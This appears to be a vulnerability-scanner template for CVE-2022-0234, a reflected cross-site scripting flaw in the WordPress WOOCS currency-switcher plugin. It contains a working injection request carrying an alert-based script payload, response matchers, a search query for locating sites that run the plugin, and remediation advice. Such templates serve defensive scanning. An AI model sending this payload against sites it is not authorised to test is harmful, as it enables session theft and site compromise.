http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <img src onerror=alert(document.domain)>
    - '"current_currency":'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /wp-admin/admin-ajax.php?action=woocs_get_products_price_html&woocs_in_order_currency=<img%20src%20onerror=alert(document.domain)>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-0234
info:
  author: Akincibor
  classification:
    cpe: cpe:2.3:a:pluginus:woocs:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-0234
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.85144
    epss-score: 0.0259
  description: 'WordPress WOOCS plugin before 1.3.7.5 is susceptible to cross-site
    scripting. The plugin does not sanitize and escape the woocs_in_order_currency
    parameter of the woocs_get_products_price_html AJAX action, available to both
    unauthenticated and authenticated users, before outputting it back in the response.
    An attacker can inject arbitrary script in the browser of an unsuspecting user
    in the context of the affected site. This can allow the attacker to steal cookie-based
    authentication credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    google-query: inurl:"wp-content/plugins/woocommerce-currency-switcher"
    max-request: 1
    product: woocs
    vendor: pluginus
    verified: true
  name: WordPress WOOCS < 1.3.7.5 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/fd568a1f-bd51-41bb-960d-f8573b84527b
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0234
  - https://plugins.trac.wordpress.org/changeset/2659191
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0234
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update the WordPress WOOCS plugin to version 1.3.7.5 or later to mitigate
    the XSS vulnerability.

    '
  severity: medium
  tags: cve2022,cve,wpscan,wordpress,wp-plugin,wp,xss,woocs,pluginus,vuln
